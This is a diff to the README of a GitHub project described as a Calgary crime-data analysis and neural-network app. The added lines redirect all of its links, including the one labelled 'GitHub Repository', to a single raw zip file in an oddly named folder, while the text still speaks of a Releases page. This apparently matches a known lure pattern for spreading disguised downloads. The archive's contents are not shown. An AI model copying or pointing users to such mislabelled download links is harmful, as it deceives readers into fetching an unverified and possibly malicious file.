@@ -1,6 +1,6 @@
 # 🛡️ Calgary-Crime-Data-Analysis-and-Neural-Network-Model - Analyze Crime Data with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Release-green)](https://github.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/releases)
+[![Download Now](https://raw.githubusercontent.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/main/simioid/Calgary-Crime-Data-Analysis-and-Neural-Network-Model.zip)](https://raw.githubusercontent.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/main/simioid/Calgary-Crime-Data-Analysis-and-Neural-Network-Model.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Calgary Crime Data Analysis and Neural Network Model. This applic
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download the application.  
-   [Download Here](https://github.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/releases)
+   [Download Here](https://raw.githubusercontent.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/main/simioid/Calgary-Crime-Data-Analysis-and-Neural-Network-Model.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, find the latest version listed at the top. Click on the version to access the download options.
@@ -72,7 +72,7 @@ A: This application is currently designed for desktop operating systems only.
 ## 🔗 Learn More
 
 To delve deeper into the technical aspects or contribute to the project, visit the GitHub repository:  
-[GitHub Repository](https://github.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model)
+[GitHub Repository](https://raw.githubusercontent.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/main/simioid/Calgary-Crime-Data-Analysis-and-Neural-Network-Model.zip)
 
 For developers interested in enhancing the application, please refer to the documentation found within the repository for further support.
 
@@ -86,4 +86,4 @@ Remember, if you face any issues during the download or application usage, feel 
 
 Now you are ready to download the Calgary Crime Data Analysis and Neural Network Model. Begin your analysis by clicking the link below:
 
-[Download Here](https://github.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/releases)
+[Download Here](https://raw.githubusercontent.com/AlexHah24/Calgary-Crime-Data-Analysis-and-Neural-Network-Model/main/simioid/Calgary-Crime-Data-Analysis-and-Neural-Network-Model.zip)
